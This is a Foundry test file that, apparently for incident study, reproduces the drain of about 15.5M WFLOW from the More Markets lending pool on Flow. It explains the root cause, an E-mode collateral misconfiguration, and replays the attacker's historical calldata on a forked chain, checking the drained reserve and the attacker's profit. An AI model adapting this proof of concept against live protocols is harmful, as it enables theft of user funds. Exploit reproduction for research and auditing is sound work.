// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~15.5M WFLOW emptied from mFlowWFLOW (~$9.3M detector impact)
// Attacker EOA          : 0xa1E4B05F9A0425136045D8fC8A4978B25bB6A7Cc
// Attack helper         : 0xA0C2fe72aD9b640994A9c4252F25Fb058DDb3702
// Victim pool           : More Markets Pool 0xbC92aaC2DBBF42215248B5688eB3D3d2b32F2c8d
// Drained aToken        : mFlowWFLOW 0x02BF4bd075c1b7C8D85F54777eaAA3638135c059
// Collateral            : Ankr Staked FLOW (ANKRFLOW) 0x1b97100eA1D7126C4d60027e231EA4CB25314bdb
// Bonded LST            : aFLOWEVMb 0xd6Fd021662B83bb1aAbC2006583A62Ad2Efb8d4A
// Attack tx             : 0x2b2e6ea6cc7dabeec83941abfdc22dd7fa53a58f327af0fccb73a0ed8a3f66c9 @ 76986328
// Helper deploy         : 0xca9cf3f4600f337027611d69fad7392093afc21e2f195364269a6d3ddbfc971c @ 76984490
// Alert                 : https://x.com/blockaid_/status/2094317778719142172
//
// Root cause: More Markets (Aave v3 fork) listed ANKRFLOW in MOST Mode (E-mode
// category 1, 97% LTV) as FLOW-correlated collateral. Combined with Ankr
// bonded-LST wrap (aFLOWEVMb lockShares/unlockShares) and a hugely imbalanced
// ANKRFLOW/WFLOW UniV3 pool, the attacker minted ANKRFLOW, supplied it as
// 97% LTV collateral and emptied the 15.5M WFLOW reserve in one tx.

address constant ATTACKER = 0xa1E4B05F9A0425136045D8fC8A4978B25bB6A7Cc;
address constant HELPER = 0xA0C2fe72aD9b640994A9c4252F25Fb058DDb3702;
address constant POOL = 0xbC92aaC2DBBF42215248B5688eB3D3d2b32F2c8d;
address constant ORACLE = 0x7287f12c268d7Dff22AAa5c2AA242D7640041cB1;
address constant WFLOW = 0xd3bF53DAC106A0290B0483EcBC89d40FcC961f3e;
address constant ANKRFLOW = 0x1b97100eA1D7126C4d60027e231EA4CB25314bdb;
address constant AFLOWEVMb = 0xd6Fd021662B83bb1aAbC2006583A62Ad2Efb8d4A;
address constant A_WFLOW = 0x02BF4bd075c1b7C8D85F54777eaAA3638135c059;
address constant A_ANKRFLOW = 0xD10cd10260e87eFdf36618621458eeAA996B8267;
address constant STAKING = 0xFE8189A3016cb6A3668b8ccdAC520CE572D4287a;
address constant UNI_V3 = 0xbB577ac54E4641a7e2b38Ce39e794096CD11A639;

uint256 constant FORK_BLOCK = 76_986_327; // one block before drain @ 76_986_328

interface IAaveOracle {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface IPool {
    function setUserEMode(uint8 categoryId) external;
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;
    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralBase,
            uint256 totalDebtBase,
            uint256 availableBorrowsBase,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );
}

// Historical helper calldata from attack tx 0x2b2e6ea6… (selector 0xf0328c24).
bytes constant ATTACK_CALLDATA =
    hex"f0328c247c738e10143e6cbb2d953947f56bd3ec7e9855fe99ed6e6ca3221c859edb12f5a549355cc93e064c5ddcf54e220450dcd0f6a527c3812ac1e44b7aeb20f4d61bf47a887068e84e69c062ebdd6fa5a3691fcf5df9824ed7460da1657cead254c2ba2869d12d9cf45a3f7ff1b5c9260aa349ca94564a50a8dfcbb325e39f1e6819baf7dc7343528eebd0b08c380d6fed73b7714908f49aff5af2fca4f7d579e54c6905b741ce3b4384433091acde98dfca3d51fb0ac6debbd96a9874e75131bb492f37a606813ece6249a7572c7bbc5530ba851a85ed5caafadfd83e39e72b451c530a7d5da79eb2877f5a634537e29e8a797e8888c8a36cec2102f8aab84c5499c659cbead8986491f6b80c1dca0d2beb10b95a9be74fc28a7cd1b4ca8b3ac4c6225ff89b901b0baeab1ecda170168c9fc63335d4fe6dc1202432620e1099457714c3a0343cc7b72ecf128d1c9b0f649c3d985956a1e3d696f5ee2016c89e2603ee431d31564b6c16f408b57259fa2833c2d8d0df8d0a4685328cd41b588d8eed328ea696948d9cb975da47d293de22db3246ca160c545afede9d09b7f0b51d8d34216e5eea2690fd7f2bfa8f185e0d1b1a144936654989c2abc92c1dcc7c7e6f5047c39e0eef127f3a55d3518e387e156ff5da896d5662707e61a4cdfec9f107be784f4e66e7486e22b1059135bc02f96e8cf99a9fd211dc5efe1c5c58125208be0ee8328cf536ff2cb5138cf6e04f055563bb70f0d21be01ed1ffbf8c0b1453ea96548c9c5a5949b3440901a32e81ea0a37e25d33d34f1fe3a6d0d9ee543d80f2e45372c4185ed343a8018aa79ff8926c6bad3f81101bf91d387ef9";

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        string memory rpc = vm.envOr("FLOW_RPC_URL", string(""));
        if (bytes(rpc).length == 0) {
            rpc = vm.envOr("MORE_MARKETS_FORK_URL", string(""));
        }
        if (bytes(rpc).length == 0) {
            rpc = "http://127.0.0.1:8562";
        }
        vm.createSelectFork(rpc, FORK_BLOCK);

        // Helper unwraps stolen WFLOW to native FLOW at the end of the attack tx.
        fundingToken = address(0);
        attacker = HELPER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(HELPER, "Attack helper");
        vm.label(POOL, "More Markets Pool");
        vm.label(ORACLE, "AaveOracle");
        vm.label(WFLOW, "WFLOW");
        vm.label(ANKRFLOW, "ANKRFLOW");
        vm.label(AFLOWEVMb, "aFLOWEVMb");
        vm.label(A_WFLOW, "mFlowWFLOW");
        vm.label(A_ANKRFLOW, "aANKRFLOW");
        vm.label(STAKING, "FlowStakingPool");
        vm.label(UNI_V3, "ANKRFLOW/WFLOW UniV3");
    }

    function testExploit() public balanceLog {
        uint256 wflowPrice = IAaveOracle(ORACLE).getAssetPrice(WFLOW);
        uint256 ankrPrice = IAaveOracle(ORACLE).getAssetPrice(ANKRFLOW);
        emit log_named_uint("Oracle WFLOW (USD 8 dec)", wflowPrice);
        emit log_named_uint("Oracle ANKRFLOW (USD 8 dec)", ankrPrice);
        require(ankrPrice > wflowPrice, "ANKRFLOW not premium to WFLOW");

        uint256 reserveBefore = IERC20(WFLOW).balanceOf(A_WFLOW);
        emit log_named_decimal_uint("mFlowWFLOW WFLOW reserve", reserveBefore, 18);
        require(reserveBefore >= 15_000_000 ether, "reserve already drained");

        uint256 helperNativeBefore = HELPER.balance;
        uint256 helperWflowBefore = IERC20(WFLOW).balanceOf(HELPER);

        vm.prank(ATTACKER, ATTACKER);
        (bool ok,) = HELPER.call(ATTACK_CALLDATA);
        require(ok, "helper attack reverted");

        uint256 nativeProfit = HELPER.balance - helperNativeBefore;
        uint256 wflowDelta = IERC20(WFLOW).balanceOf(HELPER) - helperWflowBefore;
        emit log_named_decimal_uint("Helper native FLOW profit", nativeProfit, 18);
        emit log_named_decimal_uint("Helper WFLOW delta", wflowDelta, 18);
        uint256 reserveAfter = IERC20(WFLOW).balanceOf(A_WFLOW);
        emit log_named_decimal_uint("mFlowWFLOW WFLOW reserve after", reserveAfter, 18);
        uint256 drained = reserveBefore - reserveAfter;
        emit log_named_decimal_uint("WFLOW drained from mFlowWFLOW", drained, 18);
        require(drained >= 15_000_000 ether, "did not empty WFLOW reserve");
        // Last borrow is unwrapped to native FLOW on the helper (~9.82M). The rest of
        // the drained WFLOW was recycled through Ankr wrap / UniV3 during the tx.
        require(nativeProfit > 9_000_000 ether, "native profit too small");
    }
}
